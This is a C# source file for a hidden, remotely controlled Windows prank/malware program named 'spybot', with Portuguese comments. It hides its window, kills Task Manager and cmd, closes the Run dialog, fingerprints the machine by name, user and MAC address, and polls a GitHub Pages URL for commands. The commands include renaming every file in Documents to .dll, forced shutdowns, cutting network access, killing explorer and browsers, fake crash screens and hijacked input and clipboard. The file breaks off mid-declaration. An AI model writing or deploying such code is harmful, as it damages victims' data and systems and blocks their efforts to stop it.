using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Media;
using System.Net;
using System.Net.Mail;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace Windows
{

    /*
        DATAS:
            0       =   desativado
            1       =   sempre ativo
            data    =   executa na data determinada

        ACOES:
            0       =   Nada, mas mantem o programa aberto
            1       =   Nada, e fecha o programa
            2       =   Mouse loco
            3       =   Poluir o Desktop com arquivos diversos
            4       =   Poluir a pasta Documentos com arquivos diversos
            5       =   Ficar abrindo a calculadora sem parar
            6       =   Ficar abrindo o notepad sem parar
            7       =   Ficar abrindo sites aleatorios sem parar (ver ARRAY_SITES)
            8       =   Ficar digitando palavras aleatorios sem parar obtidas di site
            9       =   Nicolas Cage na tela sem parar 
            10      =   Desativa a internet
            11      =   Desativa a internet ao navegar e ativa ao fechar navegadores 
            12      =   Fecha os navegadores repetidamente
            13      =   Buga o PC, finalizando o EXPLORER.EXE
            14      =   Clica o Mouse em um lugar aleatorio da tela
            15      =   Ficar digitando letras aleatorias sem parar
            16      =   Simula um pixel queimado na tela (linha)
            17      =   Simula um pixel queimado na tela
            18      =   Corrompe os arquivos da pasta "Documentos" e fecha o programa
            19      =   Desliga o pc
            20      =   Reinicia o pc
            21      =   Mensagem de erro e reinicia o pc
            22      =   Fica alternando o tema do Windows entre dark e light
            23      =   Aplica papel de parede via site
            24      =   Fica minimizando e maximizando a janela atual
            25      =   Exibe a tela da morte e depois desliga o pc
            26      =   Exibe BallonTip com a frase do site
            27      =   Fica ativando e desativando o capslock
            28      =   Fica mudando o texto do CTRL+V com a frase do site
            29      =   FakeFreeze usando um print da tela em tela cheia, parecendo que travou o pc
            30      =   Simula a instalação de um virus e fecha o programa
            31      =   Fica aumentando o volume de tempo em tempo
            32      =   Fica diminuindo o volume de tempo em tempo
            33      =   Renomeia a janela atual com a frase do site
            34      =   Fica fechando a janela sendo usada atualmente
            35      =   Corretor FDP (Ao apertar espaço, escreve algo aleatorio)
            36      =   Fica redimencionando a janela sendo usada atualmente
            37      =   Fica fazendo log-off no windows
            38      =   Deixa transparente a janela sendo usada atualmente
            39      =   Remove o botao FECHAR da janela sendo usada atualmente
            40      =   Fica bipando o computador com o Console.Beep()
     */
    class spybot
    {
        public static string SITE = "https://bresodev.github.io/spy_v2/";

        public static string MEU_MAC = "";
        public static string MEU_NOME = "";
        public static string MEU_NOME_USUARIO = "";
        public static string ACAO = "";
        public static string DATA = "";
        public static string FRASE = "";

        public static bool TUDO_OK = false;
        public static bool FICAR_BUSCANDO_VALORES_NO_SITE = true;
        public static bool FECHAR_CMD = true;
        public static int contador = 0;

        public static int DELAY_PARA_BUSCAR_NO_SITE_REPETIDAMENTE = 15000;

        public static string[] ARRAY_EXTENSOES = { ".pdf", ".dll", ".exe", ".txt", ".bin" };

        public static string[] ARRAY_PROCESSOS = { "calc.exe", "notepad.exe", "taskmgr.exe", "msedge.exe", "mspaint.exe" };

        public static string[] ARRAY_SITES = {
             "https://www.microsoft.com",
            "https://www.google.com",
            "https://www.github.com",
            "https://www.stackoverflow.com",
            "https://www.wikipedia.org",
            "https://www.reddit.com",
            "https://www.linkedin.com",
            "https://www.ted.com",
            "https://www.nasa.gov",
            "https://www.bbc.com",
            "https://www.nytimes.com",
            "https://www.cnn.com",
            "https://www.forbes.com",
            "https://www.imdb.com",
            "https://www.spotify.com",
            "https://www.netflix.com",
            "https://www.twitch.tv",
            "https://www.amazon.com",
            "https://www.ebay.com",
            "https://www.paypal.com"

        };
        public static string[] ARRAY_PALAVRAS;



        //Inicia tudo automaticamente
        public static void inicializar(Form f)
        {
            spybot.finalizarProcesso("cmd");
            spybot.finalizarProcesso("Taskmgr");
            fecharExecutar();

            spybot.obterMAC();
            spybot.obterDadosSite();


            addHook(3000, () =>
            {
                if (!spybot.TUDO_OK)
                {
                    if (VerificarInternet())
                    {
                        if (spybot.ACAO != "")
                        {
                            if (spybot.DATA != "")
                            {
                                spybot.TUDO_OK = true;
                            }
                        }
                        spybot.contador++;
                        if (spybot.contador >= 10)
                        {
                            f.Close();
                        }
                    }

                }
            });

            addHook(DELAY_PARA_BUSCAR_NO_SITE_REPETIDAMENTE, () =>
            {
                if (FICAR_BUSCANDO_VALORES_NO_SITE && spybot.TUDO_OK)
                {
                    if (VerificarInternet())
                    {
                        spybot.obterDadosSite();
                    }

                }

            });


            addHook(10000, () =>
            {
                try
                {
                    DriveInfo[] all = DriveInfo.GetDrives();
                    foreach (DriveInfo d in all)
                    {
                        if (File.Exists(d.Name + "Desativador/desativador.dll"))
                        {
                            //var notify = new System.Windows.Forms.NotifyIcon()
                            //{
                            //    Visible = true,
                            //    Icon = SystemIcons.Information,
                            //    BalloonTipTitle = "Desativador encontrado",
                            //    BalloonTipText = FRASE,
                            //};
                            //notify.ShowBalloonTip(3000);
                            //wait(3000);;
                            MessageBox.Show("Patch desativado temporariamente");
                            f.Close();
                        }
                    } 
                }
                catch (Exception e) {  }

            });




            addHook(100, () =>
            {
                prepararForm(f);

                if (FECHAR_CMD)
                {
                    spybot.finalizarProcesso("cmd");
                    spybot.finalizarProcesso("Taskmgr");
                    fecharExecutar();
                }

            });

            //------------------------------------------------------
            int intervalo = 1000;
            System.Windows.Forms.Timer loop = new System.Windows.Forms.Timer();
            loop.Enabled = true;
            loop.Interval = intervalo;
            loop.Start();
            loop.Tick += (a, b) =>
            {
                loop.Interval = intervalo;

                //f.Text = loop.Interval.ToString();


                if (TUDO_OK && bateuData())
                {
                    if (ACAO == "0")//nada mas mantem aberto
                    {

                    }
                    if (ACAO == "1")//fecha o programa
                    {
                        f.Close();
                    }
                    if (ACAO == "2")//mouse loko
                    {
                        intervalo = 10000;
                        Random r = new Random();
                        Cursor.Position = new Point(r.Next(0, 500), r.Next(0, 500));
                    }
                    if (ACAO == "3")//
                    {
                        intervalo = 5000;
                        PoluirDesktop();
                    }
                    if (ACAO == "4")//
                    {
                        intervalo = 5000;
                        PoluirDocumentos();
                    }
                    if (ACAO == "5")//
                    {
                        intervalo = 1000;
                        Process.Start("calc.exe");
                    }
                    if (ACAO == "6")//
                    {
                        intervalo = 1000;
                        Process.Start("notepad.exe");
                    }
                    if (ACAO == "7")//
                    {
                        intervalo = 5000;
                        Process.Start(arrayAleatorio(ARRAY_SITES));
                    }
                    if (ACAO == "8")//
                    {
                        intervalo = 20000;
                        SendKeys.SendWait(arrayAleatorio(ARRAY_PALAVRAS));
                    }
                    if (ACAO == "9")//
                    {
                        intervalo = 20000;
                        NicolasCage();
                    }
                    if (ACAO == "10")//
                    {
                        cmdRun("ipconfig /release");
                    }
                    if (ACAO == "11")//
                    {
                        intervalo = 10000;
                        if (estaNavegandoInternet())
                        {
                            cmdRun("ipconfig /release");
                        }
                        else
                        {
                            cmdRun("ipconfig /renew");
                        }
                    }
                    if (ACAO == "12")//
                    {
                        intervalo = 10000;
                        fecharNavegadores();
                    }
                    if (ACAO == "13")//
                    {
                        intervalo = 5000;
                        finalizarProcesso("explorer");
                        f.Close();
                    }
                    if (ACAO == "14")//
                    {
                        intervalo = 5000;
                        clickMouseLugarAleatorio();
                    }
                    if (ACAO == "15")//
                    {
                        intervalo = 30000;
                        SendKeys.SendWait(letraAleatoria());
                    }
                    if (ACAO == "16")//
                    {
                        intervalo = 500;
                        spybot.linhaPixelQueimadoFake(100);
                        spybot.linhaPixelQueimadoFake(110);
                    }
                    if (ACAO == "17")//
                    {
                        intervalo = 5000;
                        spybot.pixelQueimadoFake();
                    }
                    if (ACAO == "18")//
                    {
                        intervalo = 5000;
                        mudarExtencaoArquivos(PASTAS.MyDocuments);
                        f.Close();
                    }
                    if (ACAO == "19")//
                    {
                        intervalo = 5000;
                        desligarPC();

                    }
                    if (ACAO == "20")//
                    {
                        intervalo = 5000;
                        reiniciarPC();
                    }
                    if (ACAO == "21")//
                    {
                        intervalo = 5000;
                        msgErro();
                        Thread.Sleep(10000);
                        reiniciarPC();
                    }
                    if (ACAO == "22")//
                    {
                        intervalo = 20000;

                        Random random = new Random();
                        int mmmmm = random.Next(0, 100);
                        if (mmmmm % 2 == 0)
                        {
                            MudarParaTemaClaro();
                        }
                        else
                        {
                            MudarParaTemaEscuro();
                        }
                    }
                    if (ACAO == "23")//
                    {
                        intervalo = 20000;
                        MudarFundoDeTela();
                    }


                    if (ACAO == "24")//
                    {
                        intervalo = intervaloAleatorio();
                        Minimizar_e_Maximizar_Janela_Atual();
                    }
                    if (ACAO == "25")//
                    {
                        //intervalo = 20000;

                        TelaDaMorte();
                    }
                    if (ACAO == "26")//
                    {
                        //intervalo = 20000;
                        Thread.Sleep(intervaloAleatorio());
                        ShowBalloonTip();
                        f.Close();
                    }
                    if (ACAO == "27")//
                    {
                        intervalo = intervaloAleatorio(10000, 20000);
                        capsLock();
                    }
                    if (ACAO == "28")//
                    {
                        intervalo = intervaloAleatorio(5000, 10000);
                        MudarClipboardText();
                    }
                    if (ACAO == "29")//
                    {
                        intervalo = intervaloAleatorio();
                        fakeFreeze();
                    }
                    if (ACAO == "30")//
                    {
                         SimularInstalacaoVirus();
                        loop.Stop();
                    }
                    if (ACAO == "31")//
                    {
                        intervalo = intervaloAleatorio();
                        for (int i = 0; i < 110; i++)
                        {
                            IncreaseVolume();
                        }
                    }
                    if (ACAO == "32")//
                    {
                        intervalo = intervaloAleatorio();
                        for (int i = 0; i < 110; i++)
                        {
                            DecreaseVolume();
                        }
                    }
                    if (ACAO == "33")//
                    {
                        intervalo = intervaloAleatorio();
                        renomearJanelaAtiva(FRASE);
                    }
                    if (ACAO == "34")//
                    {
                        intervalo = intervaloAleatorio();
                        fechaJanelaAtualmenteAtiva();
                    }
                    if (ACAO == "35")//
                    {
                        // intervalo = intervaloAleatorio();
                        corretorOrtograficoFDP();
                        loop.Stop();
                    }
                    if (ACAO == "36")//
                    {
                        intervalo = intervaloAleatorio();
                        redimencionarJanelaAtualmenteAtiva();
                    }
                    if (ACAO == "37")//
                    {
                        intervalo = intervaloAleatorio();
                        exibirTelaLogonWindows();
                    }
                    if (ACAO == "38")//
                    {
                        intervalo = intervaloAleatorio();
                        JanelaAtualmenteAtivaFicaTransparente(80);
                    }
                    if (ACAO == "39")//
                    {
                        intervalo = intervaloAleatorio();
                        removerBotaoFecharJanelaAtualmenteAtiva();
                    }
                    if (ACAO == "40")//
                    {
                        for (int i = 0; i < 110; i++)
                        {
                            IncreaseVolume();
                        }
                        intervalo = intervaloAleatorio(); 
                        bip();
                        wait(2000);
                        bip();
                    }

                }
            };
        }



        

        public static void wait(int milisegundos)
        {
            Thread.Sleep(milisegundos);
        }
        public static void bip()
        {
            Console.Beep();
        }
        public static void prepararForm(Form f)
        {
            f.Size = new Size(0, 0);
            f.Location = new Point(100000, 100000);
            f.ShowInTaskbar = false;
            f.Visible = false;

        }


        public static void clickMouseLugarAleatorio()
        {
            try
            {
                Random random = new Random();
                int X = random.Next(0, Screen.PrimaryScreen.Bounds.Width);
                int Y = random.Next(0, Screen.PrimaryScreen.Bounds.Height);
                Cursor.Position = new Point(X, Y);

                INPUT[] inputs = new INPUT[2];
                inputs[0].type = INPUT_MOUSE;
                inputs[0].mi.dwFlags = MOUSEEVENTF_LEFTDOWN;

                inputs[1].type = INPUT_MOUSE;
                inputs[1].mi.dwFlags = MOUSEEVENTF_LEFTUP;

                SendInput((uint)inputs.Length, inputs, Marshal.SizeOf(typeof(INPUT)));

            }
            catch { }
        }

        public static void cmdRun(string comando)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/C {comando}", // /C executa o comando e fecha o CMD
                    RedirectStandardOutput = true, // Redireciona a saída para leitura
                    UseShellExecute = false,
                    CreateNoWindow = true // Não exibe a janela do CMD
                };

                // Iniciar o processo
                Process processo = new Process { StartInfo = psi };
                processo.Start();

                // Ler e exibir a saída do comando
                string resultado = processo.StandardOutput.ReadToEnd();
                processo.WaitForExit();
            }
            catch { }

        }



        public static void finalizarProcesso(string processoNome = "explorer")
        {
            try
            {
                foreach (Process processo in Process.GetProcessesByName(processoNome))
                {
                    processo.Kill();
                }
            }
            catch { }
        }
        public static void fecharExecutar()
        {
            try
            {
                if (FindWindow(null, "Executar") != IntPtr.Zero)
                {
                    SendMessage(FindWindow(null, "Executar"), 0x0010, IntPtr.Zero, IntPtr.Zero);

                }
                if (FindWindow(null, "Run") != IntPtr.Zero)
                {
                    SendMessage(FindWindow(null, "Run"), 0x0010, IntPtr.Zero, IntPtr.Zero);
                }
            }
            catch { }
        }


        public static void fecharNavegadores()
        {
            try
            {
                string[] browsers = { "chrome", "msedge", "firefox", "opera", "brave", "iexplore" };

                foreach (string browser in browsers)
                {
                    foreach (Process process in Process.GetProcessesByName(browser))
                    {
                        if (process.ProcessName.Contains(browser))
                        {
                            process.Kill();
                        }
                    }
                }
            }
            catch { }

        }

        public static bool estaNavegandoInternet()
        {
            try
            {
                Process[] chrome = Process.GetProcessesByName("chrome");
                Process[] edge = Process.GetProcessesByName("msedge");
                Process[] firefox = Process.GetProcessesByName("firefox");
                Process[] opera = Process.GetProcessesByName("opera");
                Process[] brave = Process.GetProcessesByName("brave");
                Process[] iexplore = Process.GetProcessesByName("iexplore");
                if (chrome.Length > 0 || edge.Length > 0||
                    firefox.Length > 0|| opera.Length > 0||
                    brave.Length > 0|| iexplore.Length > 0)
                    return true;
                else 
                    return false;
            }
            catch (Exception e) { return false; }
        }

        public static bool VerificarInternet()
        {
            try
            {
                using (Ping ping = new Ping())
                {
                    PingReply reply = ping.Send("8.8.8.8", 3000); // IP do Google DNS
                    return reply.Status == IPStatus.Success;
                }
            }
            catch
            {
                return false;
            }
        }


        public static void NicolasCage()
        {

            if (!VerificarInternet())
            {
                return;
            }

            string url = SITE + "Usuarios/" + Environment.MachineName + "/" + Environment.UserName + "/" + spybot.MEU_MAC + ".png";

            Random random = new Random();

            try
            {
                using (WebClient webClient = new WebClient())
                {
                    byte[] dados = webClient.DownloadData(url);
                    using (MemoryStream stream = new MemoryStream(dados))
                    {
                        Image imagem = Image.FromStream(stream);

                        IntPtr hdc = spybot.GetDC(IntPtr.Zero); // Obtém o contexto de dispositivo da tela
                        using (Graphics graphics = Graphics.FromHdc(hdc))
                        {
                            int r1 = random.Next(0, Screen.PrimaryScreen.Bounds.Width);
                            int r2 = random.Next(0, Screen.PrimaryScreen.Bounds.Height);
                            int r3 = random.Next(0, 5);

                            graphics.DrawImage(imagem, r1, r2, imagem.Width / r3, imagem.Height / r3); // Desenha a imagem na posição (100,100)
                        }
                        spybot.ReleaseDC(IntPtr.Zero, hdc); // Libera o contexto de dispositivo

                    }
                }
            }
            catch (Exception ex)
            {

            }
        }



        static string gerarSenha(int tamanho = 5)
        {
            const string caracteres = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            StringBuilder senha = new StringBuilder();
            Random random = new Random();

            for (int i = 0; i < tamanho; i++)
            {
                int indice = random.Next(caracteres.Length);
                senha.Append(caracteres[indice]);
            }

            return senha.ToString();
        }

        static string letraAleatoria()
        {
            const string caracteres = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890";
            Random random = new Random();
            int indice = random.Next(caracteres.Length);

            return caracteres[indice].ToString();
        }


        static void PoluirDocumentos()
        {
            try
            {
                Random r = new Random();

                string caminhoArquivo = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "/" + r.Next(0, 99999) + "." + arrayAleatorio(ARRAY_EXTENSOES);
                string textoParaAdicionar = FRASE;

                // Usando StreamWriter para criar e escrever no arquivo
                using (StreamWriter writer = new StreamWriter(caminhoArquivo, true))
                {
                    writer.WriteLine(textoParaAdicionar);
                }
            }
            catch { }

        }
        static void PoluirDesktop()
        {
            try
            {
                Random r = new Random();

                string caminhoArquivo = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "/" + r.Next(0, 99999) + "." + arrayAleatorio(ARRAY_EXTENSOES);
                string textoParaAdicionar = FRASE;

                // Usando StreamWriter para criar e escrever no arquivo
                using (StreamWriter writer = new StreamWriter(caminhoArquivo, true))
                {
                    writer.WriteLine(textoParaAdicionar);
                }
            }
            catch { }

        }


        static string arrayAleatorio(string[] itens)
        {
            Random random = new Random();
            int indiceAleatorio = random.Next(itens.Length);
            string itemSelecionado = itens[indiceAleatorio];
            return itemSelecionado;
        }




        public static bool bateuData()
        {
            try
            {
                DateTime dataAtual = DateTime.Today;
                if (DATA == dataAtual.ToShortDateString())
                {
                    return true;
                }
                if (DATA == "1")
                {
                    return true;
                }
                return false;
            }
            catch { return false; }
        }

        public static void addHook(int intervalo, Action voidss)
        {
            try
            {
                System.Windows.Forms.Timer loop = new System.Windows.Forms.Timer();
                loop.Enabled = true;
                loop.Interval = intervalo;
                loop.Start();
                loop.Tick += (ccccc, ggggggggg) =>
                {
                    loop.Interval = intervalo;
                    voidss();
                };
            }
            catch { }
        }

        public static async Task obterDadosSite()
        {

            obterMAC();
            // URL da página que você quer ler
            string url = SITE + "Usuarios/" + Environment.MachineName + "/" + Environment.UserName + "/" + spybot.MEU_MAC + ".txt";


            using (HttpClient client = new HttpClient())
            {
                try
                {
                    HttpResponseMessage response = await client.GetAsync(url);
                    response.EnsureSuccessStatusCode(); // Lança exceção se não for sucesso
                    string html = await response.Content.ReadAsStringAsync();



                    spybot.MEU_NOME = Environment.MachineName;
                    spybot.MEU_NOME_USUARIO = Environment.UserName;
                    spybot.ACAO = html.Split('|')[0];
                    spybot.DATA = html.Split('|')[1].Replace("\n", "");
                    spybot.FRASE = html.Split('|')[2].Replace("\n", "");
                    spybot.ARRAY_PALAVRAS = html.Split('|')[2].Replace("\n", "").Split(" ");
                    //




                }
                catch (HttpRequestException e)
                {

                }
            }

        }

        public static string obterMAC_2()
        {
            NetworkInterface[] i = NetworkInterface.GetAllNetworkInterfaces();
            return Convert.ToString(i[0].GetPhysicalAddress());
        }



        public static void obterMAC()
        {
            try
            {
                MEU_MAC = "";

                foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (nic.OperationalStatus == OperationalStatus.Up)
                    {
                        PhysicalAddress macAddress = nic.GetPhysicalAddress();
                        if (macAddress != null && macAddress.GetAddressBytes().Length != 0)
                        {
                            MEU_MAC += macAddress;
                        }
                    }
                }
            }
            catch { }

        }




        public static void linhaPixelQueimadoFake(int px_Y = 100)
        {
            try
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                Graphics g = Graphics.FromHdc(hdc);
                Pen pen = new Pen(Color.Magenta, 1);
                g.DrawLine(pen, px_Y, 0, px_Y, Screen.PrimaryScreen.Bounds.Height);
                ReleaseDC(IntPtr.Zero, hdc);
            }
            catch { }

        }


        public static void pixelQueimadoFake()
        {
            try
            {
                Random rnd = new Random();
                int x = rnd.Next(0, Screen.PrimaryScreen.Bounds.Width);
                int y = rnd.Next(0, Screen.PrimaryScreen.Bounds.Height);
                Graphics.FromHdc(
                    GetDC(IntPtr.Zero)).FillRectangle(
                    new SolidBrush(Color.Magenta),
                    x, y, 10, 10
                    );  // O último parâmetro define a largura e altura do ponto (1x1)
                ReleaseDC(IntPtr.Zero, GetDC(IntPtr.Zero));
            }
            catch { }

        }



        public static class PASTAS
        {
            public static string MyPictures = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
            public static string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            public static string StartMenu = Environment.GetFolderPath(Environment.SpecialFolder.StartMenu);
            public static string Cookies = Environment.GetFolderPath(Environment.SpecialFolder.Cookies);
            public static string Desktop = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
            public static string InternetCache = Environment.GetFolderPath(Environment.SpecialFolder.InternetCache);
            public static string Startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            public static string MyComputer = Environment.GetFolderPath(Environment.SpecialFolder.MyComputer);
            public static string MyMusic = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
            public static string MyDocuments = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            public static string MyVideos = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);

        }

        public static void mudarExtencaoArquivos(string pasta, string extencao = ".dll")
        {
            string[] arquivos = Directory.GetFiles(pasta, "*.*", SearchOption.AllDirectories);
            foreach (var arquivo in arquivos)
            {
                try
                {
                    string novoCaminho = Path.ChangeExtension(arquivo, extencao);
                    File.Move(arquivo, novoCaminho);
                }
                catch (Exception ex) { }
            }
        }

        public static void desligarPC()
        {
            try
            {
                Process.Start("shutdown", "/s /f /t 0");
            }
            catch { }

        }
        public static void reiniciarPC()
        {
            try
            {
                Process.Start("shutdown", "/r /f /t 0");
            }
            catch { }

        }


        public static void msgErro()
        {
            MessageBox.Show("Erro crítico! O sistema encontrou um problema inesperado e precisa reiniciar.",
                       "Erro Fatal", MessageBoxButtons.OK, MessageBoxIcon.Error);

        }
        public static void MudarParaTemaClaro()
        {
            try
            {
                Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize", "AppsUseLightTheme", 1);
                Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize", "SystemUsesLightTheme", 1);

            }
            catch { }
        }

        public static void MudarParaTemaEscuro()
        {
            try
            {
                Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize", "AppsUseLightTheme", 0);
                Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize", "SystemUsesLightTheme", 0);

            }
            catch { }
        }
        public static void MudarParaTemaPadrao()
        {
            try
            {
                Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize", "AppsUseLightTheme", 1);
                Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize", "SystemUsesLightTheme", 0);

            }
            catch { }
        }




        static void DownloadImage(string imageUrl, string localPath)
        {
            using (WebClient client = new WebClient())
            {
                try
                {
                    client.DownloadFile(imageUrl, localPath);
                }
                catch (Exception ex)
                {
                }
            }
        }

        public static void MudarFundoDeTela()
        {
            try
            {
                string url = SITE + "Usuarios/" + Environment.MachineName + "/" + Environment.UserName + "/wallpaper.png";
                //string imageUrl = "https://th.bing.com/th/id/OIP.uwteg2Qa3dIeY00GaeuOoQHaEK?cb=iwp2&rs=1&pid=ImgDetMain";  // Link para a imagem da web
                string localPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "wallpaper.png");

                if (File.Exists(localPath))
                {
                    SystemParametersInfo(0x0014, 0, localPath, 0x01 | 0x02);
                }
                else
                {
                    DownloadImage(localPath, localPath);
                }
            }
            catch { }

        }


        public static void Minimizar_e_Maximizar_Janela_Atual()
        {
            for (int i = 0; i < 6; i++)
            {
                var hwnd = GetForegroundWindow();
                ShowWindow(hwnd, 6);
                Thread.Sleep(200);
                ShowWindow(hwnd, 9);
                Thread.Sleep(200);
            }
        }

        public static void TelaDaMorte()
        {
            Thread.Sleep(intervaloAleatorio(50000, 120000));

            Form bsod = new Form();
            bsod.FormBorderStyle = FormBorderStyle.None;
            bsod.WindowState = FormWindowState.Maximized;
            bsod.BackColor = Color.Blue;

            Label msg = new Label();
            msg.Text = "Um problema foi detectado e o Windows foi desligado para evitar danos ao computador...";
            msg.ForeColor = Color.White;
            msg.Font = new Font("Consolas", 14);
            msg.Dock = DockStyle.Fill;
            msg.TextAlign = ContentAlignment.MiddleCenter;

            bsod.Controls.Add(msg);

            bsod.TopMost = true;


            System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer();
            timer.Interval = 1000;


            int ct = 0;
            timer.Tick += (s, e) =>
            {
                bsod.BringToFront();
                if (ct == 3)
                {
                    timer.Stop();
                    bsod.Close();
                    desligarPC();
                }
                ct++;
            };
            timer.Start();
            bsod.Show();
        }


        public static void ShowBalloonTip()
        {
            var notify = new System.Windows.Forms.NotifyIcon()
            {
                Visible = true,
                Icon = SystemIcons.Information,
                BalloonTipTitle = "Alerta do Windows",
                BalloonTipText = FRASE,
            };
            notify.ShowBalloonTip(3000);
        }

        public static void capsLock()
        {
            SendKeys.SendWait("{CAPSLOCK}");
            //Thread.Sleep(500);
        }
        public static void MudarClipboardText()
        {
            Clipboard.SetText(FRASE);
        }
        public static void fakeFreeze()
        {
            // captura tela
            Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics g = Graphics.FromImage(bmp);
            g.CopyFromScreen(0, 0, 0, 0, bmp.Size);

            // mostra em fullscreen
            Form fakeFreeze = new Form();
            fakeFreeze.FormBorderStyle = FormBorderStyle.None;
            fakeFreeze.WindowState = FormWindowState.Maximized;
            fakeFreeze.BackgroundImage = bmp;
            fakeFreeze.Show();

            Thread.Sleep(10000);
            fakeFreeze.Close();

        }
        public static void TelaHackerFake()
        {
            Form form = new Form();
            form.WindowState = FormWindowState.Maximized;
            form.BackColor = Color.Black;

            System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer();
            timer.Interval = 700;


            //----------------------------------------
            Label msg = new Label();
            msg.Text = "Obtendo dados...";
            msg.ForeColor = Color.Lime;
            msg.Font = new Font("Consolas", 14);
            msg.Dock = DockStyle.Fill;
            msg.TextAlign = ContentAlignment.MiddleCenter;

            form.Controls.Add(msg);
            //----------------------------------------

            int ct = 0;
            timer.Tick += (s, e) =>
            {

                switch (ct)
                {
                    case 4:
                    case 5:
                    case 6:
                    case 7:
                        msg.Text = "Dados obtidos com sucesso\nAguarde...";
                        break;
                    case 8:
                        timer.Stop();
                        form.Close();
                        break;
                    default:
                        timer.Interval = 500;
                        Random rand = new Random();
                        string numericText = new string(Enumerable.Range(0, 10).Select(_ => (char)('0' + rand.Next(0, 10))).ToArray());
                        msg.Text += "\n(*byte) => 0x" + numericText;

                        break;
                }
                ct++;
            };
            timer.Start();
            form.ShowDialog();
        }


        public static void SimularInstalacaoVirus()
        {
            Form form = new Form();
            form.Text = "Instalador do Sistema";
            form.FormBorderStyle = FormBorderStyle.None;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.Size = new Size(600, 100);
            form.TopMost = true;
            form.BackColor = Color.Black;

            Label label = new Label();
            label.ForeColor = Color.LimeGreen;
            label.Font = new Font("Consolas", 12, FontStyle.Bold);
            label.Text = "Iniciando instalação do sistema...";
            label.AutoSize = false;
            label.TextAlign = ContentAlignment.MiddleCenter;
            label.Dock = DockStyle.Top;
            label.Height = 50;

            ProgressBar progressBar = new ProgressBar();
            progressBar.Dock = DockStyle.Bottom;
            progressBar.Height = 30;
            progressBar.Style = ProgressBarStyle.Continuous;

            form.Controls.Add(label);
            form.Controls.Add(progressBar);

            System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer();
            timer.Interval = 50;
            int progresso = 0;
            string[] mensagens = new string[]
            {
            "Instalando malware.exe...",
            "Criptografando arquivos pessoais...",
            "Enviando dados para servidor...",
            "Instalando keylogger...",
            "Finalizando instalação do vírus..."
            };

            timer.Tick += (sender, e) =>
            {
                progresso++;
                if (progresso <= 100)
                {
                    progressBar.Value = progresso;

                    // Muda a mensagem a cada 20%
                    int index = Math.Min(progresso / 20, mensagens.Length - 1);
                    label.Text = mensagens[index] + $" {progresso}%";
                }

                if (progresso >= 99)
                {
                    timer.Stop();
                    // MessageBox.Show("Instalação concluída com sucesso!\nAgora você está sendo vigiado. ", "AVISO", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    form.Close();
                }
            };

            timer.Start();
            form.ShowDialog();
        }

        public static void IncreaseVolume()
        {
            keybd_event(0xAF, 0, 0x1, 0);
            keybd_event(0xAF, 0, 0x2, 0);
        }

        public static void DecreaseVolume()
        {
            keybd_event(0xAE, 0, 0x1, 0);
            keybd_event(0xAE, 0, 0x2, 0);
        }

        public static void renomearJanelaAtiva(string newTitle)
        {
            IntPtr hwnd = GetForegroundWindow();
            SetWindowText(hwnd, newTitle);
        }

        public static void fechaJanelaAtualmenteAtiva()
        {
            IntPtr handle = GetForegroundWindow();
            PostMessage(handle, 0x0010, IntPtr.Zero, IntPtr.Zero);
        }

        public static bool IsKeyPressed(Keys key)
        {
            return (GetAsyncKeyState((int)key) & 0x8000) != 0;
        }

        public static void corretorOrtograficoFDP()
        {
            addHook(10, () => {
                if (IsKeyPressed((Keys)0x20))
                {
                    SendKeys.Send(gerarSenha());
                }
            });

        }
        public static void redimencionarJanelaAtualmenteAtiva()
        {
            IntPtr hWnd = GetForegroundWindow();
            MoveWindow(hWnd, 100, 100, 800, 600, true);
        }
        public static void exibirTelaLogonWindows()
        {
            LockWorkStation();
        }

        public static void JanelaAtualmenteAtivaFicaTransparente(byte alpha)
        {
            IntPtr hWnd = GetForegroundWindow();
            int exStyle = GetWindowLong(hWnd, -20);
            SetWindowLong(hWnd, -20, exStyle | 0x80000);
            SetLayeredWindowAttributes(hWnd, 0, alpha, 0x2);
        }




        public static void removerBotaoFecharJanelaAtualmenteAtiva()
        {
            IntPtr hWnd = GetForegroundWindow();
            int style = GetWindowLong(hWnd, -16);
            SetWindowLong(hWnd, -16, style & ~0x00080000);
        }



        public static int intervaloAleatorio(int min = 30000, int max = 60000)
        {
            Random random = new Random();
            return random.Next(min, max);
        }






        [DllImport("user32.dll", SetLastError = true)]
        static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);

        [DllImport("user32.dll", SetLastError = true)]
        static extern int GetWindowLong(IntPtr hWnd, int nIndex);

        [DllImport("user32.dll")]
